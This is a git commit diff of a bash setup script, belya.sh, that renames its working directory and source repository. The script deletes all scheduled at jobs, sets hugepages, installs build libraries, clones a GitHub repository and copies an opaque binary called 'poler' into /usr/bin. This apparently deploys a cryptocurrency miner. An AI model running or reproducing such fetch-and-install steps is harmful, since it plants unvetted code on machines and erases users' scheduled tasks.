f73b6970d58d8145bcfba4ee919e17cb721f0b10
burkabest <52100051+burkabest@users.noreply.github.com>
2019-08-05 17:48:16 -0400

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/shusstriy/
+rm -rf /tmp/ihor1/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir skill1
-git clone https://github.com/skill1/shusstriy.git /tmp/skill1
-cd /tmp/skill1
-chmod +x /tmp/skill1/poler
+cd /tmp && mkdir ihor1
+git clone https://github.com/burkabest/ihor1.git /tmp/ihor1
+cd /tmp/ihor1
+chmod +x /tmp/ihor1/poler
 chmod 777 ./*.sh
-cp /tmp/skill1/poler /usr/bin/
+cp /tmp/ihor1/poler /usr/bin/
 sleep 3
 
 sudo apt-get install dos2unix
